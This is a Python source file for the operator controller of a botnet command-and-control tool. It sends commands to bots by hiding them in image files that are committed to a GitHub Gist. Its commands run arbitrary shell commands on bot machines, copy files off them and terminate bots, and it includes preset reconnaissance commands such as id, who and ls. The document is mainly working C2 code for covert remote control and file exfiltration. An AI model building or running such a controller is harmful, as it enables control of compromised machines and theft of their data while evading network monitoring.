import argparse
import os
import select
import sys
from typing import Optional, Any, Dict, Union

from terminal import gray, rst, cyan, magenta, yellow, green, red
from common import \
    CONTROL_IMAGE, \
    UPDATE_INTERVAL, \
    KEEP_ALIVE_TIMEOUT, \
    now_ms, \
    is_image, \
    decode_data, \
    encode_data, \
    format_timestamp, \
    ParticipantBase


class Controller(ParticipantBase):

    def _setup(self) -> None:
        super()._setup()

        self._current_timestamp: int = now_ms()
        self._bots = {}
        self._pending_commands = {}

        pass

    def run(self) -> None:
        self._setup()

        while True:
            self._update_state()
            print(
                f'\nAuto update in {cyan}{UPDATE_INTERVAL}{rst} seconds. Press {yellow}enter{rst} to force update.\n'
                f'Press {red}Ctrl-C{rst} to stop.\n'
                f'Enter a command. Use {cyan}?{rst} or {cyan}help{rst} to show help.\n'
                '> ',
                end='',
            )
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                # do not remove trailing whitespace except newline chars
                cmd_str = sys.stdin.readline().lstrip().rstrip('\r\n')
                self._process_command(cmd_str)
            else:
                # so we do not write to the prompt line
                # note: we could also use ASCII ESC sequences to clear the prompt (and add colors as well)
                print('')

        pass

    @staticmethod
    def stop() -> None:
        print('\nStopping the controller. Note that the bots might still be running.')
        print('Use terminate command to stop a specific bot.')

    def _update_bot(self, name: str, data: Any) -> bool:
        print(f'trying update bot {name}', data)

        if not isinstance(data, dict):
            return False
        if 'last_update' not in data or not isinstance(data['last_update'], int):
            return False
        last_update = data['last_update']
        if (self._current_timestamp - last_update) > KEEP_ALIVE_TIMEOUT:
            if name is self._bots:
                print(f'bot {name} timed out, removing')
                del self._bots[name]
                del self._pending_commands[name]
                return False

        if name not in self._bots:
            bot = {
                'last_update': last_update,
                'cmd': None,
            }
            self._bots[name] = bot
            self._pending_commands[name] = None
        else:
            self._bots[name]['last_update'] = last_update

        pending_cmd = self._bots[name]['cmd']

        if pending_cmd is not None:
            result = data['result'] if 'result' in data and isinstance(data['result'], dict) else None
            result_id = result['id'] if 'id' in result and isinstance(result['id'], str) else None

            if pending_cmd['id'] == result_id:
                print('command finished')

                result_timestamp = \
                    result['timestamp'] if 'timestamp' in result and isinstance(result['timestamp'], str) else None
                result_exit_code = \
                    result['exit_code'] if 'exit_code' in result and isinstance(result['exit_code'], str) else None
                result_stdout = result['stdout'] if 'stdout' in result and isinstance(result['stdout'], str) else None
                result_stderr = result['stderr'] if 'stderr' in result and isinstance(result['stderr'], str) else None

                print(f'exit_code={result_exit_code}')
                print(result_stdout)
                print(result_stderr)

                self._bots[name]['cmd'] = None
                self._pending_commands[name] = None

        return True

    def _update_state(self) -> None:
        print(f'{gray}updating state ...{rst}')
        self._current_timestamp = now_ms()

        self._comm_client.pull_changes()

        data_files = set(filter(lambda f: f != CONTROL_IMAGE and is_image(f), os.listdir('comm')))

        for bot_name in data_files:
            # TODO: consider handling exceptions and removing invalid files instead of just crashing
            bot_data = decode_data('comm/' + bot_name)
            if not self._update_bot(bot_name, bot_data):
                print(f'removing {bot_name}')
                os.remove('comm/' + bot_name)
                self._comm_client.add([bot_name])

        # handles case when the bot's file is gone,
        # but we have still record in the memory
        bots_to_delete = []
        for bot_name, bot in self._bots.items():
            print(bot_name, bot, (self._current_timestamp - bot['last_update']) // 1000)
            if (self._current_timestamp - bot['last_update']) > KEEP_ALIVE_TIMEOUT:
                print(f'bot {bot_name} timed out, removing')
                bots_to_delete.append(bot_name)
                # cannot delete here during the dict iteration
            elif not os.path.exists('comm/' + bot_name):
                print(f'bot image {bot_name} does not exist, removing bot')
                bots_to_delete.append(bot_name)
        for bot_name in bots_to_delete:
            del self._bots[bot_name]
            del self._pending_commands[bot_name]
            if os.path.exists('comm/' + bot_name):
                os.remove('comm/' + bot_name)
                self._comm_client.add([bot_name])

        encode_data(
            image_file='lib/' + CONTROL_IMAGE,
            data=self._pending_commands,
            output_file='comm/' + CONTROL_IMAGE,
        )
        self._comm_client.add([CONTROL_IMAGE])

        self._comm_client.commit_and_push_if_needed()

        print(f"{gray}successful update on {green}{format_timestamp(self._current_timestamp)}{rst}")

        pass

    def _print_bots(self) -> None:
        print(f'\nBOTS ({cyan}{len(self._bots)}{rst}):')
        for bot_name, bot_data in self._bots.items():
            pretty_name = bot_name[0:-4]  # strip .png or .jpg extension
            record_age: float = (self._current_timestamp - bot_data['last_update']) / 1000
            print(
                f'  bot {yellow}{pretty_name}{rst}\n'
                f'    last update {red if record_age > 70 else green}{record_age:.2f}{rst} seconds ago'
            )
        print('')
        pass

    def _is_valid_bot(self, bot: str) -> bool:
        return bot in self._bots

    # COMMANDS

    # noinspection PyMethodMayBeStatic
    def _generate_new_command_id(self) -> str:
        return os.urandom(16).hex()

    def _create_command(self, name: str, args: Dict[str, Union[str, bool, int]]) -> Dict[str, Union[str, bool, int]]:
        header = {
            'id': self._generate_new_command_id(),
            'timestamp': now_ms(),
            'name': name,
        }
        return header + args

    def _set_command(self, bot: str, cmd: Dict[str, Union[str, bool, int]]) -> None:
        self._bots[bot]['cmd'] = cmd
        self._pending_commands[bot] = cmd
        return

    @staticmethod
    def _print_help() -> None:
        print(
            f'\n{red}AVAILABLE COMMANDS:\n\n'
            f'{cyan}help{rst}\n'
            f'  {gray}Prints this help.{rst}\n'
            f'{cyan}bots\n'
            f'  {gray}Lists all bots and their status.{rst}\n'
            f'{cyan}terminate {yellow}<bot>{rst}\n'
            f'  {gray}Terminates the bot.{rst}\n'
            f'{cyan}shell {yellow}<bot> {magenta}<command>{rst}\n'
            f'  {gray}Runs the given command on the bot using the following Python code.\n'
            f'    subprocess.run(args=[{magenta}<command>{rst}{gray}], shell={magenta}True{rst}{gray})\n'
            f'  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            f'  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.{rst}\n'
            f'{cyan}run {yellow}<bot> {magenta}<command>{rst}\n'
            f'  {gray}Runs the given command on the bot using the following Python code.\n'
            f'    subprocess.run(args={magenta}shlex.split(<command>){rst}{gray}, shell={magenta}False{rst}{gray})\n'
            f'  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            f'  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.{rst}\n'
            f'{cyan}copyFrom {yellow}<bot> {magenta}<file name>{rst}\n{gray}'
            f'  {gray}Copies the file from the bot to the controller\'s workdir.{rst}\n'
            f'{cyan}do {yellow}<bot>{rst} id{rst}\n'
            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}id\n'
            f'{cyan}do {yellow}<bot>{rst} who{rst}\n'
            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}who{rst}\n'
            f'{cyan}do {yellow}<bot>{rst} ls {magenta}<path>{rst}\n'
            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}ls -lha <path>{rst}\n'
        )

    def _process_terminate_command(self, bot) -> None:
        self._set_command(bot, self._create_command(
            name='terminate',
            args={},
        ))
        pass

    def _process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
        if cmd is None:
            print(f'{red}Missing <command> argument!{rst}')
            return
        if cmd == '':
            print(f'{red}Invalid empty <command> argument!{rst}')
            return
        self._set_command(bot, self._create_command(
            name='run',
            args={
                'shell': shell,
                'cmd': cmd,
            },
        ))
        pass

    def _process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
        if file_name is None:
            print(f'{red}Missing <file name> argument!{rst}')
            return
        if file_name == '':
            print(f'{red}Invalid empty <file name> argument!{rst}')
            return
        self._set_command(bot, self._create_command(
            name='copy_from',
            args={
                'file_name': file_name,
            },
        ))
        pass

    def _process_do_command(self, bot, action: Optional[str]) -> None:
        if action is None:
            print(f'Missing do action!')
            return
        if action == 'id':
            self._process_run_command(bot, shell=True, cmd='id')
            return
        if action == 'who':
            self._process_run_command(bot, shell=True, cmd='who')
            return
        if action.startswith('ls '):
            path = action[3:]
            if path == '':
                print(f"{red}Invalid path '{path}'!{rst}")
                return
            self._process_run_command(bot, shell=True, cmd='ls -lha ' + path)
            return
        print(f"{red}Invalid do action '{action}'!{rst}")
        return

    def _process_command(self, cmd_str) -> None:
        if cmd_str == '':
            # no command
            return

        parts = cmd_str.split(sep=' ', maxsplit=1)
        cmd_name = parts[0]

        if cmd_name not in {'help', '?', 'bots', 'terminate', 'shell', 'run', 'copyFrom', 'do'}:
            print(f"{red}Invalid or unknown command '{cmd_str}'!{rst}")
            print(f'Type {cyan}?{rst} or {cyan}help{rst} to show help.')
            return

        if cmd_name == 'help' or cmd_name == '?':
            self._print_help()
            return

        if cmd_name == 'bots':
            self._print_bots()
            return

        # all other commands should have format <cmd_name> <bot> <...the rest>
        if len(parts) != 2:
            print(
                f'{red}Missing {yellow}<bot>{rst} {red}argument!\n'
                f'Type {cyan}bots{rst}{red} to list all available bots.{rst}'
            )
            return

        sub_parts = parts[1].split(sep=' ', maxsplit=1)
        bot = sub_parts[0]
        args_str = sub_parts[1] if len(sub_parts) == 2 else None
        if not self._is_valid_bot(bot):
            print(
                f"{red}Invalid bot '{yellow}{bot}{rst}{red}' given!\n"
                f"Type {cyan}bots{rst}{red} to list all available bots.{rst}"
            )
            return

        if cmd_name == 'terminate':
            self._process_terminate_command(bot)
            return
        if cmd_name == 'shell':
            self._process_run_command(bot, shell=True, cmd=args_str)
            return
        if cmd_name == 'run':
            self._process_run_command(bot, shell=False, cmd=args_str)
            return
        if cmd_name == 'copyFrom':
            self._process_copy_from_command(bot, file_name=args_str)
            return
        if cmd_name == 'do':
            self._process_do_command(bot, action=args_str)
            return

        print(f"{red}Invalid or unknown command '{cmd_str}'!{rst}")
        print(f'Type {cyan}?{rst} or {cyan}help{rst} to show help.')

    pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--author',
        help='Override default git commit author',
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='Remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='Skip resetting the git repos if they already exist.',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='Skip updating the git repos if they already exist.',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='Shortcut for combination of of --skip-init-reset and --skip-init-pull.',
    )
    _args = _parser.parse_args()
    _controller = Controller(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        author=_args.author,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _controller.run()
    except KeyboardInterrupt:
        _controller.stop()
